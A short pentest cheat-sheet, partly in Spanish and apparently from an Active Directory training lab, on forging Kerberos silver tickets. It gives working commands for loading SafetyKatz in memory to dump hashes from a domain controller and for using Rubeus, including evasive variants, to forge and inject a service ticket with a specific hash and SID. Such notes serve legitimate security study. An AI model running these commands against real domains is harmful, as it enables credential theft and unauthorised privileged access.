# Silver Ticket  

Tags: #AD #Windows #Powershell #Rubeus 

```bash  
# If you have access to machine account credential, you can forward silver tickets 

- A valid Service Ticket or TGS ticket (Golden ticket is TGT).
- Encrypted and Signed by the hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.
- Services rarely check PAC (Privileged Attribute Certificate).
- Services will allow access only to the services themselves.
- Reasonable persistence period (default 30 days for computer accounts).
```

```powershell 
# Extracción 
❯ winrs -r:dcorp-dc cmd   # Conectarse al DC con svcadmin

❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit" # Descargar y ejecutar Safetikatz en memoria para obtener el hash ntlm del usuario krbtgt

Nota
	- Cuando muestra los NTLM en esta ocasión son los rc4 que colocamos en el rubeus
```

## Rubeus 

```powershell 
❯ C:\AD\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt

# Con loader
❯ C:\AD\Loader.exe -path C:\AD\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt    # Inject the ticket in the current process 

❯ C:\AD\Loader.exe -path C:\AD\Rubeus.exe -args klist    # Mirar los tickets 


Notes:
	1. Just like the Golden ticket, /ldap option queries DC for information related to the user.
	2. Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, CIFS and many more.
```

[![Silver-Ticket.png](https://i.postimg.cc/nVm94P6N/Silver-Ticket.png)](https://postimg.cc/0r8Nxc5C)